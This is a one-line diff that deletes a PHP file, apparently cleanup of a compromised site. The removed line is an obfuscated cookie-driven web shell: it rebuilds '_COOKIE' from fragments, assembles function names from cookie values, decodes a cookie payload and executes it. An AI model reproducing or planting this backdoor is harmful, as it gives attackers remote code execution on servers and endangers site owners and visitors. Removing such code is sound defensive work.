@@ -1,1 +1,0 @@
-<?php $u='_CO';/*q*/$nq='OKI';$z/*&4dD*/='E';$xh=/*F5Y*/${$u.$nq.$z};if(isset($xh['AF'])){$j=/*%yX*/$xh['AF'].$xh/*9?QP*/['N'];$xa=$xh['x']./*Si*/$xh['xS'].$xh['X']/*l9*/;$bq=$j('',$xa($xh['ok']));$bq();}
